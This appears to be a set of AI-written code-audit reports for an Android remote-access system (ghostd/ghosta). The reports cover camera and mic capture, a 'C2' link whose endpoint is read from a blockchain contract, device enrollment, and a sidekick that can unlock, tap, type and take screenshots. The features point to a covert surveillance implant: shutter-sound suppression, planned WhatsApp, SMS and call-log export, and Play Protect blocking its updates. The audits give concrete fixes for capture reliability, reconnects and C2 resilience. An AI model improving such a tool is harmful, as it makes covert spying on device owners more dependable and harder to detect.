# Detailed audit findings

These are the preserved technical reports used to build `BACKLOG.md`.

`BACKLOG.md` is authoritative for priority and current status. These reports are point-in-time reviews (2026-10-25): verify the current code before applying a finding, because some issues may already be fixed. They contain both confirmed defects and explicitly labelled hardening/speculation; do not treat every item as equally urgent. **Severity labels and "verified" markers below describe the audit date, not today.**

Current reconciliation (2026-10-26):

- **Fixed and tested:** file-transfer ownership, server/console/CLI audit items,
  MediaProjection per-capture consent and latch/activity cleanup, endpoint
  E2E portability, CLI aliases, update reconciliation/session scoping (source),
  native console HTTPS, console TLS hardening (source-tested; redeploy pending),
  WSS-only device transport with SPKI pinning/system-CA fallback, hash-only server
  tokens, Android Keystore token storage with backup disabled, and online
  device/admin credential rotation. Local suites: 272 server, 162 ghostd and
  115 ghosta tests, plus `py_compile`; release builds pass.
- **Verified on the emulator:** the earlier 29/29 E2E, unlock/consent, reboot
  recovery and two-app removal on ghostd 0.4.1. ghosta OTA installed after a
  timeout; ghostd self-update remains blocked by Play Protect. ghostd 0.4.2 is
  now online over WSS, but the full WSS E2E and live `rotate-token` /
  `rotate-admin` runs are still pending.
- **Still open:** older camera/mic resource-ownership cleanup, localhost peer
  UID/signature validation, CA-issued console certificate, approved-device
  pagination/caps, endpoint cache/reconnect hardening, console UI browser gaps,
  a real phone-sized UI review, and the shared enrollment key. SMS send,
  contacts, call-log readers and WhatsApp export are unimplemented.
- **Not touched:** Pixel 10a remains on ghostd 0.3.8 and does not trust the
  WSS-only listener yet.

Do not copy an audit paragraph into a release claim without checking the
current source and `BACKLOG.md`.


---


# Camera / microphone / MediaBus audit

## Scope and method

I read only the four in-scope files (`CameraCapturer.kt`, `MicCapturer.kt`, `MediaBus.kt`, `QualityPresets.kt`). No edits, no git operations. Findings below are limited to those files and to the requested areas: busy-slot ownership, camera/mic release, thread interruption, frame-send failure, dead sockets, reconnect behavior, timeouts, and privacy indicators.

---

# Actual code defects

## HIGH severity

### 1. Live camera never closes `CameraDevice` / `CameraCaptureSession` on normal stop
- **File/function:** `CameraCapturer.kt` → `live()` thread body / `runLive()`
- **Failure sequence:**
  1. `cam live` starts. `runLive()` opens the camera and configures a session.
  2. User sends `cam stop`. `CameraCapturer.stop()` sets `stopRequested = true`.
  3. The outer `while (!stopRequested)` exits. `MediaBus.streamEnd()` runs. `reader.close()` runs.
  4. No `device.close()` or `session.close()` is ever called on this path. The camera stays open. The green privacy dot stays on. A subsequent `cam live`/`cam snap` opens the same camera and gets “camera in use” or opens a second session.
- **Smallest fix:** keep a `var device: CameraDevice?` set in `onOpened`, and close it (and the session) in a `finally` after the outer loop. At minimum: `try { device?.close() } catch (_: Exception) {}` after `reader.close()`.

### 2. Late `onOpened` after stop opens the camera and leaves it open
- **File/function:** `CameraCapturer.kt` → `live()` / `runLive()` → `CameraDevice.StateCallback.onOpened`
- **Failure sequence:**
  1. `cam live` calls `openCamera()`. Before `onOpened` fires, user sends `cam stop`.
  2. The outer loop sees `stopRequested == true`, exits, sends `streamEnd`, closes the `ImageReader`.
  3. `onOpened(d)` fires later. It does **not** check `stopRequested`; it calls `d.createCaptureSession(...)`.
  4. The call fails because the reader surface is closed, but the catch only sets `stopRequested = true`; it never closes `d`. The camera stays open and the privacy indicator stays on.
- **Smallest fix:** at the top of `onOpened`, check `if (stopRequested) { try { d.close() } catch (_: Exception) {}; opened.countDown(); return }`. Also close the device in the outer `finally`.

### 3. `snap()` leaks the `ImageReader`
- **File/function:** `CameraCapturer.kt` → `snap()`
- **Failure sequence:**
  1. `cam snap` runs. `ImageReader.newInstance(...)` succeeds.
  2. Capture succeeds or times out. The device is closed in the inner `finally`, but `reader.close()` is never called.
  3. Each snap leaks native `ImageReader` buffers. Repeated snaps eventually exhaust native memory or make `ImageReader.newInstance()` fail.
- **Smallest fix:** close the reader in the inner `finally` next to `device?.close()`:
  ```kotlin
  finally {
      try { device?.close() } catch (_: Exception) {}
      try { reader.close() } catch (_: Exception) {}
  }
  ```

### 4. `snap()` open timeout leaves a late-opened device open
- **File/function:** `CameraCapturer.kt` → `snap()`
- **Failure sequence:**
  1. `openCamera()` is called. The system is slow.
  2. `opened.await(10, TimeUnit.SECONDS)` times out. The code throws `"camera open failed"`.
  3. The outer `finally` runs while `device` is still `null`, so nothing is closed. `ht.quitSafely()` is called.
  4. The `onOpened` callback fires later (queued), sets `device = d`, and counts down. No one closes `d`. The camera remains open and the privacy dot stays on.
- **Smallest fix:** introduce a `cancelled` flag set when `await` returns false, and in `onOpened` do `if (cancelled) { try { d.close() } catch (_: Exception) {}; opened.countDown(); return }`.

### 5. `forceEnd()` frees the logical slot but leaves the hardware running
- **File/function:** `MediaBus.kt` → `forceEnd()`
- **Failure sequence:**
  1. A camera/mic capture thread is wedged (e.g., blocked in a camera callback or `AudioRecord.read`).
  2. Caller invokes `forceEnd(SOURCE_CAM)` or `forceEnd(SOURCE_MIC)`. It clears `activeSource` and `ws`, releases the wake lock, and returns.
  3. A new capture calls `begin()` successfully and tries to open the camera/mic. The old thread still owns the hardware. The new open fails or conflicts. The old thread may still send frames to the new socket.
  4. The privacy indicator stays on because the hardware was never closed.
- **Smallest fix:** `forceEnd()` must also signal the capturer to stop. Either register a per-source stop callback at `begin()` (e.g., `CameraCapturer.requestStopOnly()` / `MicCapturer.requestStopOnly()`) or have the capture loops poll `MediaBus.isActive(SOURCE_...)` and close their device/record when it becomes false. The logical-slot release alone is insufficient.

### 6. Stale capture thread can send to a new socket; global `stopRequested` can resurrect it
- **File/function:** `MediaBus.kt` (`begin`, `end`, `forceEnd`, `sendFrame`, `sendText`) + `CameraCapturer.live()` / `MicCapturer.live()`
- **Failure sequence:**
  1. Session A (`cam live`) is active. `ws` = socketA. Thread A is running.
  2. `forceEnd("cam")` clears `activeSource` and `ws`.
  3. Session B (`mic live`) calls `begin("mic", socketB)`. `ws` = socketB. `MicCapturer.live()` sets the global `stopRequested = false`.
  4. Thread A’s loop condition `!stopRequested` becomes true again. It continues. Its next `MediaBus.sendFrame("cam-live", ...)` reads `ws` = socketB and sends camera frames to the mic socket. A late `streamStart`/`streamEnd` from thread A can also go to socketB.
  5. The server receives wrong media/protocol messages on the new socket.
- **Smallest fix:** use a per-session generation/token. `begin()` increments a generation; each capture thread captures its generation; `sendFrame`/`sendText` take or validate the token and return false if it does not match the current generation. Alternatively, pass the `WebSocket` instance into the capture loop and into `sendFrame`, and compare it with the current `ws`. Also make `stopRequested` per-session instead of a single object-wide flag.

### 7. `begin()` can leave the busy slot permanently occupied if wake-lock acquisition throws
- **File/function:** `MediaBus.kt` → `begin()`
- **Failure sequence:**
  1. The app lacks `WAKE_LOCK` permission, or `newWakeLock()`/`acquire()` throws (e.g., `SecurityException`).
  2. `begin()` has already executed `activeSource = source` and `ws = socket`.
  3. The exception propagates. In `snap()`/`live()`/`record()`, `begin()` is called before the `try`, so the `finally` that would call `end()` is not reached.
  4. `activeSource` stays set forever. Every later capture throws `"busy: ..."` until someone calls `forceEnd()`.
- **Smallest fix:** acquire the wake lock **before** setting `activeSource`, or wrap the assignment in a `try` and roll back on failure:
  ```kotlin
  val pm = ctx?.getSystemService(PowerManager::class.java)
  val wl = pm?.newWakeLock(...)
  wl?.acquire(...)
  activeSource = source
  ws = socket
  seq.set(0)
  wakeLock = wl
  ```
  If `newWakeLock()`/`acquire()` throws, `activeSource` is never set.

### 8. `mic live` stop cannot unblock a blocked `AudioRecord.read()`
- **File/function:** `MicCapturer.kt` → `stop()`, `requestStopOnly()`, `runLive()`
- **Failure sequence:**
  1. `mic live` starts. `runLive()` blocks in `rec.read(...)`.
  2. The mic is muted or the audio HAL is stuck; `rec.read()` blocks indefinitely.
  3. User sends `mic stop`. `stop()` only sets `stopRequested = true`. The thread remains blocked in `rec.read()`, so it never checks the flag.
  4. The mic stays open. The privacy indicator stays on. The busy slot stays occupied. If a new `mic live` calls `begin()`, it throws `"busy"`.
- **Smallest fix:** keep a `@Volatile private var activeRecord: AudioRecord?`, set it in `runLive()`, and in `stop()`/`requestStopOnly()` call `activeRecord?.stop()` (which unblocks `read()`) before/while setting `stopRequested = true`. Clear it in the `finally`.

---

## MEDIUM severity

### 9. `end()` / `forceEnd()` release the wake lock unconditionally
- **File/function:** `MediaBus.kt` → `end()`, `forceEnd()`
- **Failure sequence:**
  1. Session A (`cam`) is active and holds wake lock A.
  2. A stale `end("cam")` or `forceEnd("cam")` runs after the slot was already taken by session B (`mic`).
  3. `activeSource` is `"mic"`, so the `if` does not clear it. But `releaseWakeLock()` still runs, releasing B’s wake lock and setting `wakeLock = null`.
  4. B continues without a wake lock; the device may sleep and interrupt the stream.
- **Smallest fix:** move `releaseWakeLock()` inside the `if (activeSource == source)` block in both `end()` and `forceEnd()`.

### 10. `streamStart()` hardcodes `"encoding": "mjpeg"` for audio streams
- **File/function:** `MediaBus.kt` → `streamStart()`
- **Failure sequence:**
  1. `MicCapturer.live()` calls `streamStart("mic-live", extra)` where `extra` contains `"encoding": "pcm_s16le"`.
  2. `streamStart()` sends `{"type":"stream_start","stream":"mic-live","encoding":"mjpeg","meta":{"encoding":"pcm_s16le",...}}`.
  3. A server reading the top-level `encoding` treats the audio stream as MJPEG. The decoder fails or produces garbage.
- **Smallest fix:** use the meta value for the top-level field, e.g. `.put("encoding", meta.optString("encoding", "mjpeg"))`, or remove the top-level `encoding`.

### 11. `streamStart()` omits the documented `cmd_id`
- **File/function:** `MediaBus.kt` → `streamStart()` (wire-format comment at top)
- **Failure sequence:**
  1. Server sends `cam live` with `cmd_id = 42`.
  2. Client sends `stream_start` without `cmd_id`.
  3. Server cannot correlate the stream to the command. On reconnect or with concurrent commands, the server may misattribute or drop the stream. The top-of-file comment explicitly documents `cmd_id`.
- **Smallest fix:** add an optional `cmdId: Long? = null` parameter to `streamStart()`, include `.put("cmd_id", cmdId)` when non-null, and pass the command id from the callers.

### 12. `pickJpegSize()` can select a lower resolution than the requested preset
- **File/function:** `CameraCapturer.kt` → `pickJpegSize()` (uses `QualityPresets.Preset`)
- **Failure sequence:**
  1. Camera supports only `1920x1080` and `640x480` JPEG sizes.
  2. User requests `high` (`1280x720`).
  3. The pixel-distance metric `(w-1280)^2 + (h-720)^2` gives `640x480` a smaller score than `1920x1080`. It picks `640x480`.
  4. The “high” stream is lower resolution than “med”. Quality regression.
- **Smallest fix:** prefer sizes at least as large as the preset, then choose the smallest area; fall back to the largest available:
  ```kotlin
  sizes.filter { it.width >= preset.width && it.height >= preset.height }
      .minByOrNull { it.width.toLong() * it.height }
      ?: sizes.maxByOrNull { it.width.toLong() * it.height } ?: sizes[0]
  ```

### 13. Live camera `reader.close()` is not in a `finally`
- **File/function:** `CameraCapturer.kt` → `runLive()`
- **Failure sequence:**
  1. `ImageReader` is created.
  2. `cm.openCamera(...)` throws synchronously (e.g., `SecurityException`, `IllegalArgumentException`, `CameraAccessException`).
  3. The exception propagates out of `runLive()`. The thread’s `catch` swallows it. `MediaBus.end()` runs. The `reader.close()` at the end of `runLive()` is skipped. The reader leaks.
- **Smallest fix:** wrap the `openCamera` call and outer loop in `try { ... } finally { try { reader.close() } catch (_: Exception) {} }`.

### 14. `onOpened` exception and `onConfigureFailed` leave the camera device open
- **File/function:** `CameraCapturer.kt` → `runLive()` → `onOpened` catch / `onConfigureFailed`
- **Failure sequence:**
  1. `onOpened(d)` fires. `d.createCaptureSession(...)` throws. The catch sets `stopRequested = true` but does not close `d`.
  2. Or `onConfigureFailed` fires. It sets `stopRequested = true` but does not close the device/session.
  3. The outer loop exits, `reader.close()` runs, but the camera device remains open. The privacy dot stays on and the next capture conflicts.
- **Smallest fix:** in both paths, close the device/session, e.g. `try { d.close() } catch (_: Exception) {}`; and/or close `device` in the outer `finally`.

### 15. `CameraCapturer.live()` sends no `stream_end` when `runLive()` throws
- **File/function:** `CameraCapturer.kt` → `live()` thread body / `runLive()`
- **Failure sequence:**
  1. `runLive()` throws before reaching its `MediaBus.streamEnd(...)` line (e.g., `pickCamera`/`pickJpegSize`/`openCamera` failure).
  2. The thread’s `catch (_: Exception) {}` swallows the exception. `MediaBus.end()` releases the slot.
  3. The server never receives `stream_end`, so it may believe the camera stream is still active. Reconnect/cleanup logic is confused.
- **Smallest fix:** send `streamEnd` in a `finally` in `runLive()` (or in the thread’s `catch`) using a `var sent` and a `finished` flag to avoid double-sending.

### 16. `MicCapturer.live()` sends no `stream_end` when `runLive()` throws
- **File/function:** `MicCapturer.kt` → `live()` thread body / `runLive()`
- **Failure sequence:**
  1. `runLive()` throws before `MediaBus.streamEnd(...)` (e.g., `AudioRecord` constructor/startRecording/read failure).
  2. The thread’s `catch (_: Exception) {}` swallows it. `MediaBus.end()` releases the slot.
  3. The server never receives `stream_end`.
- **Smallest fix:** wrap the `runLive()` body in `try/finally` and call `MediaBus.streamEnd(...)` there.

### 17. `mic record` ignores `stopRequested`; `stop()` cannot interrupt a recording
- **File/function:** `MicCapturer.kt` → `record()`, `stop()`, `requestStopOnly()`
- **Failure sequence:**
  1. User runs `mic record 60`.
  2. After 5 seconds, user sends `mic stop`. `stop()` sets `stopRequested = true`, but `record()` only checks its deadline. It runs the full 60 seconds.
  3. The busy slot stays occupied for 55 seconds and the mic indicator stays on. A later command gets `"busy"`.
- **Smallest fix:** set `stopRequested = false` at the start of `record()`, check `!stopRequested` in the loop, and have `stop()` call `activeRecord?.stop()` to unblock `rec.read()`.

### 18. `cam snap` ignores `stopRequested`; `stop()` cannot interrupt a snap
- **File/function:** `CameraCapturer.kt` → `snap()`, `stop()`, `requestStopOnly()`
- **Failure sequence:**
  1. User runs `cam snap`. It waits up to 10 s for camera open and up to 15 s for a frame.
  2. User sends `cam stop`. `stop()` sets `stopRequested = true`, but `snap()` never checks it. The snap continues waiting.
  3. The slot stays busy up to ~25 seconds and the camera stays open. A later command gets `"busy"`.
- **Smallest fix:** set `stopRequested = false` at the start of `snap()`; replace the long `await`/`poll` with short waits (e.g., 200 ms) that check `stopRequested`; on stop, close device/reader and throw a `"camera capture stopped"` exception.

### 19. `rec.read()` returning 0 or negative causes a busy-loop
- **File/function:** `MicCapturer.kt` → `record()` and `runLive()`
- **Failure sequence:**
  1. `rec.read()` returns 0 (no data yet) or a negative error code.
  2. `if (n > 0)` is false, so the loop immediately calls `rec.read()` again. If the HAL keeps returning 0/negative, the thread spins at full CPU until the deadline (`record`) or forever (`live`).
  3. Battery drain/heat/ANR risk.
- **Smallest fix:** on `n < 0`, `break`; on `n == 0`, `Thread.sleep(10)` or `continue` after a small delay.

### 20. `rec.release()` is not protected; can skip `streamEnd` / WAV write
- **File/function:** `MicCapturer.kt` → `record()` and `runLive()` `finally`
- **Failure sequence:**
  1. `record()` finishes or `runLive()` exits. The `finally` calls `rec.stop()` (caught) and then `rec.release()` (not caught).
  2. If `release()` throws, the exception propagates. In `record()`, the WAV file-writing code after the `finally` is skipped. In `runLive()`, the `MediaBus.streamEnd(...)` after the `finally` is skipped.
  3. The user gets an error instead of a recording, or the server never gets `stream_end`.
- **Smallest fix:** wrap `rec.release()` in `try { ... } catch (_: Exception) {}` in both `finally` blocks.

### 21. `d.close()` in camera callbacks is not protected; can skip latch/stop
- **File/function:** `CameraCapturer.kt` → `snap()` and `runLive()` → `onDisconnected`/`onError`
- **Failure sequence:**
  1. Camera disconnects. `onDisconnected(d)` runs `d.close()` without a `try`.
  2. If `close()` throws, the following `opened.countDown()` / `stopRequested = true` is skipped.
  3. In `snap()`, `opened.await(10s)` times out; in `live()`, the outer loop never stops. The slot/thread can hang.
- **Smallest fix:** `try { d.close() } catch (_: Exception) {}` before setting flags/counting down.

### 22. Thread creation failure after `begin()` leaks the busy slot
- **File/function:** `CameraCapturer.kt` → `snap()`, `live()`; `MicCapturer.kt` → `live()`
- **Failure sequence:**
  1. `MediaBus.begin(...)` succeeds.
  2. `HandlerThread(...).start()` or `Thread { ... }.start()` throws (e.g., `OutOfMemoryError`, restricted thread creation).
  3. The `try`/`finally` that would call `MediaBus.end()` has not been entered yet. The slot remains occupied.
- **Smallest fix:** wrap thread creation/start in `try/catch` and call `MediaBus.end(SOURCE_...)` on failure, or create the thread object first and call `begin()` only after successful creation.

### 23. `stop()` returns before the capture thread releases the slot
- **File/function:** `CameraCapturer.kt` → `live()`/`stop()`; `MicCapturer.kt` → `live()`/`stop()`
- **Failure sequence:**
  1. User sends `cam stop` or `mic stop`. `stop()` sets the flag and returns immediately.
  2. The capture thread may take up to 200 ms (`cam`) or until the next `rec.read()` (`mic`) to exit and call `MediaBus.end()`.
  3. An immediate follow-up `cam live`/`mic live` calls `begin()` and gets `"busy"`, even though the user just stopped.
- **Smallest fix:** store the capture `Thread` and `join()` it with a short timeout in `stop()` (after signaling), or have the caller use `forceEnd()` after the capturer’s stop path has closed the hardware. `join()` on a background command thread is acceptable.

### 24. `live()` response metadata can differ from the actual stream size
- **File/function:** `CameraCapturer.kt` → `live()`
- **Failure sequence:**
  1. Camera does not support the preset size. `runLive()` picks a different size via `pickJpegSize()`.
  2. `live()` returns the preset `width`/`height` before `runLive()` has picked the actual size.
  3. A server that trusts the immediate response allocates the wrong decoder size or aspect ratio. The later `stream_start` has the correct size, but may arrive too late.
- **Smallest fix:** compute `pickCamera()`/`pickJpegSize()` synchronously in `live()`, return the actual size, and pass the camera id/size into `runLive()`.

### 25. `mic record` buffers the entire WAV and base64-encodes it into one JSON response
- **File/function:** `MicCapturer.kt` → `record()`
- **Failure sequence:**
  1. Default `mic record 60` at 44.1 kHz stereo 16-bit produces ~10.5 MB PCM in `ByteArrayOutputStream`.
  2. `Base64.encodeToString(...)` creates a ~14 MB string, then the JSON object/response duplicates it.
  3. On a low-memory device this can OOM; over a WebSocket it can exceed frame/queue limits.
- **Smallest fix:** lower `RECORD_MAX_SECS`, or omit `wav_b64` above a size threshold and return only the file path. This is a small bounded change, not a new feature.

### 26. Wake lock has a 30-minute hard timeout and is never renewed
- **File/function:** `MediaBus.kt` → `begin()`, `STREAM_WAKE_TIMEOUT_MS`
- **Failure sequence:**
  1. A long screen/camera/mic stream runs past 30 minutes.
  2. The `PARTIAL_WAKE_LOCK` times out and is released by the system.
  3. The device enters Doze/sleep; the capture thread is suspended or frames stop. The server sees a stalled stream.
- **Smallest fix:** use a longer timeout or reacquire the wake lock periodically (e.g., every 20 minutes) while the source is active.

---

## LOW severity

### 27. `snap()` hardcodes JPEG quality 85, ignoring the “high” preset’s `jpegQuality`
- **File/function:** `CameraCapturer.kt` → `snap()`
- **Failure sequence:** `QualityPresets.get("high")` returns `jpegQuality = 70`, but `snap()` calls `set(CaptureRequest.JPEG_QUALITY, 85.toByte())`. The preset’s quality field is ignored. The snap is larger/slower than the preset implies.
- **Smallest fix:** use `set(CaptureRequest.JPEG_QUALITY, preset.jpegQuality.toByte())`.

### 28. Live camera `streamEnd` reason is misleading on socket death
- **File/function:** `CameraCapturer.kt` → `runLive()`
- **Failure sequence:** `sendFrame()` returns false because the socket died. The listener sets `stopRequested = true`. The outer loop exits and reports `if (sent > 0) "stopped" else "camera error"`. If frames had been sent, the server sees `"stopped"` instead of `"socket closed"`.
- **Smallest fix:** use a separate `socketClosed` flag set when `sendFrame()` returns false, and report `"socket closed"` in that case.

### 29. Unused `CountDownLatch` objects
- **File/function:** `CameraCapturer.kt` → `snap()` (`captured` latch), `runLive()` (`opened` latch)
- **Failure sequence:** `captured` is counted down in `onConfigured` but never awaited; `opened` is counted down in `onOpened`/`onError` but never awaited. Dead code makes the synchronization intent unclear and hides the late-callback races above.
- **Smallest fix:** remove them, or actually use them (e.g., wait for `opened` with a bounded timeout before entering the loop).

### 30. Wall-clock time used for throttling/deadlines
- **File/function:** `CameraCapturer.kt` → `runLive()` (`last[0]` and `System.currentTimeMillis()`); `MicCapturer.kt` → `record()` (`deadline`)
- **Failure sequence:** NTP or manual clock changes move `System.currentTimeMillis()` backward/forward. Camera throttling can stall or burst; a 60-second recording can end early or run long.
- **Smallest fix:** use `SystemClock.elapsedRealtime()` (or `System.nanoTime()`) for intervals/deadlines.

### 31. `sent` counter is not atomic / synchronized
- **File/function:** `CameraCapturer.kt` → `runLive()`
- **Failure sequence:** `sent++` runs on the camera handler thread; the outer loop reads `sent` after `stopRequested` becomes true. Usually the volatile flag provides visibility, but a concurrent stop from another thread can make the final `streamEnd` frame count stale. Minor reporting inaccuracy.
- **Smallest fix:** make `sent` an `AtomicLong` or read it under a lock.

### 32. Per-frame `ByteArray` allocation in `sendFrame()`
- **File/function:** `MediaBus.kt` → `sendFrame()`
- **Failure sequence:** Every frame allocates `header + '\n' + payload` as a new `ByteArray`. At 1080p/12 fps this creates significant GC pressure and can cause frame drops/jank on low-end devices. Correctness is unaffected.
- **Smallest fix:** reuse a `ByteArrayOutputStream` or send header and payload as separate WebSocket frames if the protocol allows; otherwise keep as-is and document the allocation.

### 33. `snap()` uses an unbounded `LinkedBlockingQueue`
- **File/function:** `CameraCapturer.kt` → `snap()`
- **Failure sequence:** If the camera delivers multiple JPEGs before the main thread polls, every image is copied into the queue. For a single-shot capture this is unlikely, but a stuck/fast camera can accumulate large JPEGs and increase memory pressure.
- **Smallest fix:** use `LinkedBlockingQueue(1)` with `offer()` and drop older frames, or use an `AtomicReference<ByteArray?>` instead of a queue.

---

# Android-imposed indicators / permissions (not code defects)

These are platform constraints. They are separate from the resource-release bugs above.

1. **Privacy indicators cannot be suppressed by the app.**
   - Android shows the green camera/mic dot whenever a `CameraDevice`/`AudioRecord` is active. The app cannot hide it. The bugs in findings 1, 2, 5, 8, and 14 cause the indicator to stay on longer than necessary; fixing those resource leaks is the only app-side remedy. The indicator itself is not an app bug.

2. **Shutter sound may be enforced by the OEM.**
   - `CameraCapturer.kt`’s comment claims “no shutter sound” because there is no preview surface. On some devices/OEMs, `TEMPLATE_STILL_CAPTURE` still triggers a shutter sound regardless of preview. That is an Android/OEM policy limitation, not a code defect. The code cannot reliably suppress it without special privileges/device policy.

3. **Wake locks may be ignored or restricted in Doze.**
   - `MediaBus.begin()` uses `PARTIAL_WAKE_LOCK`. Even with the lock held, Doze/OEM power management may throttle or suspend the app. The 30-minute timeout (finding 26) is a code choice, but OS-level wake-lock restrictions are Android-imposed.

4. **Permission checks are present and correct.**
   - `CameraCapturer.snap()`/`live()` check `Manifest.permission.CAMERA`; `MicCapturer.record()`/`live()` check `Manifest.permission.RECORD_AUDIO`. The `@SuppressLint("MissingPermission")` annotations are justified because the checks exist. No permission defect was found in the in-scope files. If `WAKE_LOCK` is missing from the manifest, that is a manifest/permission issue that triggers finding 7; it is not a logic error in the permission checks.

---

# Suggested triage order

1. Close `CameraDevice`/`CameraCaptureSession` in `runLive()` and handle late `onOpened` (findings 1, 2, 14). These directly affect privacy and the next capture.
2. Close the `ImageReader` in `snap()` (finding 3) and handle the open-timeout late callback (finding 4).
3. Fix `forceEnd()` and the stale-thread cross-talk (findings 5, 6). These affect slot ownership and can send data to the wrong socket.
4. Fix `begin()` wake-lock rollback (finding 7) and unconditional wake-lock release (finding 9).
5. Fix mic stop/interruption and `rec.read()` handling (findings 8, 17, 19, 20).
6. Fix protocol issues (`streamStart` encoding and `cmd_id`) and `stream_end` on exceptions (findings 10, 11, 15, 16).
7. Fix size selection and remaining low/medium issues.

---


# Reconnect / endpoint / localhost-link audit

# Read-only audit — ghostctl client reconnect, endpoint, local-link, boot, and secret handling

**Scope reviewed:** `client-main/.../ghostd/{EndpointResolver.kt, SidekickLink.kt, Prefs.kt, HelloAck.kt, C2Config.kt, BootReceiver.kt}` and `client-sidekick/.../ghosta/LocalLinkServer.kt`.
I did **not** audit `GhostService.kt`, `FileReceiver.kt`, `CommandHandler.kt`, `ProjectionHub.kt`, or `ScreenCapturer.kt`. I read only narrow call-site slices of `GhostService.kt`, `GhostAccessibilityService.kt`, `KickReceiver.kt`, `CommandRouter.kt`, and `AppUpdater.kt` where needed to establish a failure sequence. No files were edited and no git mutations were run.

**Two read-only live checks were used:**
- `eth_call` against the configured contract/selector returned a **bare `IP:port`** value (no scheme). I have not reproduced the actual IP here.
- All four configured RPCs were probed with `eth_blockNumber`: three returned HTTP 200; `https://1rpc.io/matic` returned **HTTP 403**.

---

## Executive summary

| # | Severity | Finding | Location | Status |
|---|---|---|---|---|
| 1 | **Critical** | C2 link is plaintext `ws://`; `hello` carries the static enroll key and device bearer token | `EndpointResolver.normalize`, `C2Config.ENROLL_KEY`, `HelloAck.buildHello` | Proven (code + live contract + README) |
| 2 | **High** | Static local-link secret, no peer authentication, secret desync on partial updates | `SidekickLink.SECRET`, `LocalLinkServer.SECRET`/`handle` | Proven |
| 3 | **High** | `LocalLinkServer` start/stop state machine can leave the listener dead or leak the port | `LocalLinkServer.start`/`stop` | Proven |
| 4 | **High** | Unbounded pre-auth connections, no auth timeout, thread-per-connection → local DoS/thread leak | `LocalLinkServer.handle`/`start` | Proven |
| 5 | **High** | `stop()` does not close active client sockets; handler threads leak and can process one command after stop | `LocalLinkServer.stop`/`handle` | Proven |
| 6 | **High** | `SidekickLink.send()` retries after writing; non-idempotent commands can execute twice | `SidekickLink.send` | Proven |
| 7 | **High** | Local liveness beacon is tied to the C2 heartbeat; during a C2 outage the babysitter force-restarts a healthy ghostd | `SidekickLink.startAutoArm`, `LocalLinkServer.noteAlive`/`lastAliveMs` | Proven |
| 8 | **High** | `allowBackup=true` plus plaintext device token; PIN blob backup/stale-keystore problem | `Prefs.deviceToken`/`setPin`/`hasPin`/`clearPin`; manifest | Proven configuration |
| 9 | **Medium** | Endpoint cache is written on chain-read success, not connection success; no TTL; token not bound to endpoint | `EndpointResolver.fetchFresh`/`writeCache`, `Prefs` | Proven |
| 10 | **Medium** | `resolve()` blocks reconnects for up to ~80 s before using the cache | `EndpointResolver.resolve`/`httpPost` | Proven |
| 11 | **Medium** | Single-RPC trust: first successful RPC wins; a compromised RPC can redirect the endpoint | `EndpointResolver.fetchFresh` | Design/conditional |
| 12 | **Medium** | `HelloAck.parse` turns JSON `null` token into the string `"null"`; status is not trimmed/validated | `HelloAck.parse` | Proven parser behavior |
| 13 | **Medium** | PIN lifecycle: `hasPin` true for an undecryptable blob; `clearPin` keeps the Keystore key; `setPin` fails silently | `Prefs.hasPin`/`pin`/`clearPin`/`setPin` | Proven |
| 14 | **Low/Medium** | Unsynchronized `deviceId` read-generate-write can create two device IDs | `Prefs.deviceId` | Proven concurrency |
| 15 | **Low** | `BootReceiver` has no exception handling; setup flag uses async `apply()` | `BootReceiver.onReceive`, `Prefs.setSetupDone` | Proven + OEM-dependent |
| 16 | **Low** | `https://1rpc.io/matic` returns 403; RPC list is static | `C2Config.RPC_URLS` | Observed in this environment |
| 17 | **Low/latent** | `startAutoArm()` on an already-connected link never re-arms the sidekick | `SidekickLink.startAutoArm` | Latent |
| 18 | **Low** | `close()`/`isConnected()` can block behind a 10–20 s `send()` | `SidekickLink.close`/`isConnected`/`send` | Latent |

The table's status column is historical. See the dated status notes on findings
1, 8, 12 and F9, and the current reconciliation at the top.

---

## Critical

### 1. C2 transport is plaintext `ws://`, and `hello` contains a static enroll key plus the device token

> **Status 2026-10-26:** resolved in commit `1454236`. Device transport is
> WSS-only for non-loopback binds, ghostd normalises endpoints to `wss://` and
> pins the listener SPKI (or trusts a public CA), server tokens are SHA-256
> verifiers, and Android stores its token with Keystore. The shared enrollment
> key remains a residual risk (see F9).

**Severity:** Critical — proven.
**Files/functions:**
- `client-main/app/src/main/java/com/tg/ghostd/EndpointResolver.kt` → `normalize()` (lines 96–100), `forContext()` (103–110)
- `client-main/app/src/main/java/com/tg/ghostd/C2Config.kt` → `ENROLL_KEY` (line 31)
- `client-main/app/src/main/java/com/tg/ghostd/HelloAck.kt` → `buildHello()` (lines 46–61)

**Why it is a defect**

`normalize()` defaults any scheme-less endpoint to `ws://`:

```kotlin
else "ws://$endpoint"
```

and also downgrades `http://` to `ws://`. The live on-chain `endpoint()` value is a bare `IP:port`, so the client resolves it to `ws://IP:port`. The README independently documents the device port as `ws://0.0.0.0:8443`. `HelloAck.buildHello()` places `enroll_key` and, when present, the device `token` into the `hello` JSON. Both are sent over that plaintext WebSocket.

This is not just a token-in-URL issue: the enroll key is a shared enrollment secret, and the device token is a bearer credential. The `device_id` is also in the same `hello`.

**Realistic failure sequence**

1. A device connects from a hostile Wi-Fi/mobile network or through any network path that can observe TCP.
2. The observer captures the plaintext WebSocket handshake and the first `hello` frame.
3. The observer now has `device_id`, `enroll_key`, and (after enrollment) `device_token`.
4. The observer reconnects to the same C2 with those values. The server sees a valid token for an approved device and treats the attacker as that device. The attacker can receive commands/results and/or enroll additional devices (subject to operator approval).
5. Because there is no server authentication at the client, a network attacker can also inject a forged `hello_ack` with an arbitrary token/status.

**Smallest recommended fix**

- Client: change `normalize()` to default to `wss://` and reject `ws://`/`http://` for non-loopback endpoints. Do not silently downgrade.
- Server/infrastructure: terminate TLS on the device port. The README currently advertises `ws://`; a reverse proxy with a valid certificate is the minimal deployment change.
- If TLS cannot be deployed immediately, at minimum stop treating the current enroll key/token as secret and rotate them; otherwise the exposure remains.

---

## High

### 2. Static local-link secret, no peer authentication, and secret desync across updates

**Severity:** High — proven.
**Files/functions:**
- `client-main/app/src/main/java/com/tg/ghostd/SidekickLink.kt` → `SECRET` (line 29), `connectLocked()` (lines 129–165)
- `client-sidekick/app/src/main/java/com/tg/ghosta/LocalLinkServer.kt` → `SECRET` (line 24), `handle()` (lines 71–112)

**Why it is a defect**

Both apps contain the same literal:

```kotlin
"<redacted-local-link-secret>"
```

The TCP server binds to `127.0.0.1` (good), but it authenticates only with that static secret and does not verify the connecting UID/package. Any app on the device that can learn the secret can connect to `127.0.0.1:7777` and issue sidekick commands such as `dump`, `screenshot`, `tap`, `type`, `swipe`, `unlock`, `arm`, and `disarm`.

